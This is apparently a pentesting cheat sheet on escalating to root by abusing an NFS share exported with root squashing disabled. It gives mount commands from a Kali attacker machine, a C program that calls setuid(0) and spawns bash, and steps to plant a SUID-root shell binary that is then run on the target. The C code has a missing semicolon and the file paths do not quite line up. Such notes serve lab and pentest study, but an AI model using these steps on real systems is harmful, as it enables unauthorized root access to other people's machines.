
Files created via NFS inherit the **remote** user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.

Check the NFS share configuration on the Debian VM:

```bash
cat /etc/exports
```

Suppose we found that the **/tmp** share has root squashing disabled.

On our machine, we switch to root and create a mount point on your Kali box and mount the **/tmp** share: 

```bash
sudo su
mkdir /tmp/nfs
mount -o rw,vers=3 <target ip>:/tmp /tmp/nfs
#or
mount -w nfs <target ip>:/tmp /tmp/nfs
```

# Exploitation

### Method 1

Still using Kali's root user, now we compile this (bash.c file) c code:

```c
int main()
{  setgid(0);
   setuid(0);
   system("/bin/bash")
   return 0;
}
```

And now we compile it:

```bash
gcc bash.c -o bash
# Note that we might add -static flag if the gcc version is different that the target
```

Finally, still using Kali's root user we make the file executable and set the SUID permission:

```bash
chmod +xs /tmp/nfs/bash
```

Now we go back to the target machine and run the file to gain a root shell:

```bash
/tmp/bash -p
```

### Method 2

On the target machine we use the following command to copy the `/bin/bash` from the target machine to the nfs share:

```bash
cp /bin/bash /tmp
#we might alost use the /bin/bash from the attacker machine but because the bash versions might be different so its better to copy the target one
```

Now on the attacker machine we change the owner to the root, and give the right permissions:

```bash
chown root bash
chmod +xs bash
```

Finally, we go back to the target machine and run the file to gain a root shell:

```bash
/tmp/bash -p
```